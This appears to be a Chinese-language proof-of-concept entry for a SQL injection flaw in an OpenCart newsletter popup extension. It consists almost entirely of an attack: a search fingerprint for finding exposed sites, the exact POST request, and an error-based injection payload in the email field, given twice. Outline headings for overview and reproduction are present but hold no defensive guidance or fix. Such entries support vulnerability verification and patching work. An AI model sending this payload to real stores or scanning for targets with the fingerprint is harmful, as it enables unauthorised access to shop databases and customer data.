# OpenCart电子商务建站系统extension存在SQL注入漏洞

- **系统**：OpenCart　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`body="extension/module/so_newletter_custom_popup/newsletter"`
- **请求**：`POST /index.php?route=extension/module/so_newletter_custom_popup/newsletter HTTP/1.1`
- **关键头**：`Content-Type: application/x-www-form-urlencoded`

**请求体 / payload**
```
createdate=2024-5-15 09:4:6&email=hi' AND (SELECT 4828 FROM(SELECT COUNT(*),CONCAT(0x7e,(SELECT md5(123)),0x7e,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)#&status=0
POST /index.php?route=extension/module/so_newletter_custom_popup/newsletter HTTP/1.1
Host:
Content-Type: application/x-www-form-urlencoded
createdate=2024-5-15 09:4:6&email=hi' AND (SELECT 4828 FROM(SELECT COUNT(*),CONCAT(0x7e,(SELECT md5(123)),0x7e,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)#&status=0
>
```

**其他**
- OpenCart电子商务建站系统extension存在SQL注入漏洞: + 一、漏洞概述
+ 二、网络测绘
+ 三、漏洞复现
---
- 网络测绘: ```plain
body="extension/module/so_newletter_custom_popup/newsletter"
```